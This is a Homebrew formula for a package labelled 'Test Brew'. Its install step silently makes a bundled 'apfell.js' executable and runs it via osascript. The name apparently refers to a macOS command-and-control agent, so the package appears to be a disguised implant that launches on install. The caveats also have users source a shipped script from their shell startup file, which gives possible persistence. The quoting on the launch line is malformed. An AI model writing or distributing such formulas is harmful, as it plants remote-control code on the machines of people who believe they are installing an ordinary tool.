class Testbrew < Formula
    desc "Test Brew"
    homepage "https://github.com/testing-1-dot/"
    url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
    sha256 "53b634e6ee604cb8c39422d10074189141dc6b170e6c59fe229d40a46e8e248d"
    version "1.3"

    def install
        bin.install Dir["*"]
        system "chmod +x #{bin}/apfell.js && osascript -e "do shell script \"#{bin}/apfell.js\"""
  end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
